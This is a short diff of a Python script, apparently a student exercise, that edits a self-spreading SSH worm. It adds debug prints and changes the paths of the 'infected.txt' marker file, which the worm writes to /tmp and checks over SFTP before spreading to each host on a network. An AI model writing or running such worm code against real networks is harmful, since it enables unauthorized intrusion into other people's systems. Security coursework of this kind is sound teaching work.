@@ -31,7 +31,9 @@ def isInfectedSystem(sftp,remote,local):
 	# as infected). 
 	try:
 		sftp.stat('/tmp/infected.txt')
+		print 'its not stat'
 		sftp.get(remote, local)
+		print 'Its not get'
 		print "This system is already infected"
 		return True
 	except IOError:
@@ -273,7 +275,7 @@ for host in networkHosts:
 	if sshInfo:
 		
 		print "Trying to spread"
-		fileOUT = open('infected.txt', 'w+')
+		fileOUT = open('/tmp/infected.txt', 'w+')
 		fileOUT.write("You've been infected!!!\nZombie STYLE")
 		fileOUT.close()
 		
@@ -301,7 +303,7 @@ for host in networkHosts:
 		# 	 # (that is, we know the system is
 		# 	 # not yet infected).
         	remotepath = '/tmp/infected.txt'
-		localpath = '/home/cpsc/'
+		localpath = '/tmp/infected.txt'
 		sftp = sshInfo.open_sftp()
 		
 		if not (isInfectedSystem(sftp, remotepath, localpath)):
